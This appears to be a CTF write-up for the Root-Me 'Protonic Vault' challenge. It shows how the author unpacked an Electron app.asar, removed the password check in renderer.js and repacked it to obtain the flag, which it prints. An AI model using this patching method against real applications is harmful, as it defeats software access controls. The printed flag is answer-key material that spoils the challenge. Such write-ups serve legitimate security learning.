vulkan-1.dll Let\u0026rsquo;s uncompress the protonic-vault.zip file given for this challenge and execute protonic-vault.exe.\nThe application asks a password. Obviously, we don\u0026rsquo;t know it. I tried to reverse engineer this executable but it was hard. So i decided to look at the other files. The resources/app.asar file seemed interesting. After some google research I deduced that this application was an electron application. We can found the official github of Asar here\nSo let\u0026rsquo;s decompile this app.asar file !\nAsar decompilation We must first install asar. We can do it with this command.\nnpm install --engine-strict @electron/asar and now let\u0026rsquo;s extract this archive.\nuser@debian:~/protonic_vault/protonic-vault/resources$ asar --help\rUsage: asar [options] [command]\rManipulate asar archive files\rOptions:\r-V, --version output the version number\r-h, --help display help for command\rCommands:\rpack|p [options] \u0026lt;dir\u0026gt; \u0026lt;output\u0026gt; create asar archive\rlist|l [options] \u0026lt;archive\u0026gt; list files of asar archive\rextract-file|ef \u0026lt;archive\u0026gt; \u0026lt;filename\u0026gt; extract one file from archive\rextract|e \u0026lt;archive\u0026gt; \u0026lt;dest\u0026gt; extract archive\r*\rhelp [command] display help for command\ruser@debian:~/protonic_vault/protonic-vault/resources$ asar extract app.asar app_extracted\ruser@debian:~/protonic_vault/protonic-vault/resources$ ls\rapp.asar app_extracted\ruser@debian:~/protonic_vault/protonic-vault/resources$ ls app_extracted/\rimg index.html node_modules package.json src styles Nice ! Here is the extracted the source code of our application. The src/ folder seems interesting.\nsrc/\r├── main.js\r├── preload.js\r├── renderer.js\r└── window.jsc In the renderer.js file we can recognize our login form.\nasync function setupHandler() { let truePassword = await window.electronAPI.getPassword() document.getElementById(\u0026#34;passForm\u0026#34;).addEventListener(\u0026#34;submit\u0026#34;, async e =\u0026gt; { e.preventDefault() const passwordInput = document.getElementById(\u0026#34;password\u0026#34;) const password = passwordInput.value const resultDiv = document.getElementById(\u0026#34;result\u0026#34;) resultDiv.hidden = false if (password === truePassword) { resultDiv.innerHTML = `Welcome, dear master!\u0026lt;br/\u0026gt;Flag: ${await window.electronAPI.getFlag()}` resultDiv.className = \u0026#34;notification is-success\u0026#34; } else { resultDiv.textContent = \u0026#34;You\u0026#39;re wrong!!\u0026#34; resultDiv.className = \u0026#34;notification is-danger\u0026#34; } }) } setupHandler() The method window.electronAPI.getPassword() ask for the password. It means that our password is located in the window.jsc file, but this file is compiled into v8 bytecode.\nApplication patching I was very lazy to decompile it so I had another idea. If we patch the renderer.js file and compile it again into an other app.asar will this work? I tried. This is our new renderer.js file.\nasync function setupHandler() { let truePassword = await window.electronAPI.getPassword() document.getElementById(\u0026#34;passForm\u0026#34;).addEventListener(\u0026#34;submit\u0026#34;, async e =\u0026gt; { e.preventDefault() const passwordInput = document.getElementById(\u0026#34;password\u0026#34;) const password = passwordInput.value const resultDiv = document.getElementById(\u0026#34;result\u0026#34;) resultDiv.hidden = false resultDiv.innerHTML = `Welcome, dear master!\u0026lt;br/\u0026gt;Flag: ${await window.electronAPI.getFl\u0026gt; resultDiv.className = \u0026#34;notification is-success\u0026#34; }) } setupHandler() I just removed the condition. We compile again our patched application.\nuser@debian:~/protonic_vault/protonic-vault/resources$ asar pack app_extracted/ new_app.asar and we replace the old app.asar with our new file.\nFlag Then we executed again the protonic-vault.exe, click on submit with any password and it works ! we are login and we can get the flag.\nFlag : RM{V8_byt3c0d3_1s_n0t_3n0ugh}\nGreetings Thanks to Root-Me and Elf for this challenge. I am very glad about it being interesting at all because it was the first time I reverse engineer this type of application.\n","permalink":"https://trikkss.github.io/posts/protonic-vault-wu/","summary":"Write up of the Protonic Vault challenge from the 10k Root-Me CTF.","title":"Protonic Vault write up"}]